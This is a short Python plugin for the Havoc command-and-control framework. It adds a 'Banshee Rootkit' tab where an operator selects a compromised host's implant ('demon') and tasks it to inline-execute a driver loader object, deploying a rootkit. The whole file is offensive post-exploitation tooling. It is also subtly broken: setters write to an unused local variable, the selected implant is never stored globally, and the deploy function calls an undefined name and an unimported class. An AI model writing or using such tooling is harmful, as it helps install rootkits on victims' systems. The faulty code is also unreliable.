#!/usr/bin/env python

import havocui
import havoc
import os, re

banshee = havocui.Widget("Banshee Rootkit", True)

demons = []
selected_demon = None
path = ""
name = ""
description = ""

def get_demon(num):
    if num != 0:
        selected_demon = havoc.Demon(demons[num-1])

def set_name(text):
    dir_to_search = text

def set_description(text):
    dir_to_search = text

def set_path(text):
    dir_to_search = text

def run_banshee():
    TaskID : str    = None
    
    if selected_demon is None:
        havocui.messagebox("ERROR", "Please select a demon!")
        return
        
    packer = Packer()
    packer.addstr(name)
    packer.addstr(description)
    packer.addstr(path)

    TaskID = selected_demon.ConsoleWrite(selected_demon.CONSOLE_TASK, "Tasked demon to deploy Banshee")
    demon.InlineExecute(TaskID, "go", "Banshee/loaddriver.o", packer.getbuffer(), False)

def banshee_main():
    banshee.clear()

    demons = havoc.GetDemons()
    banshee.addLabel("<h3>Select a demon to deploy Banshee to</h3>")
    banshee.addCombobox(get_demon, "Select demon", *demons)
    banshee.addButton("Deploy", run_banshee)
    banshee.setSmallTab()

banshee_main()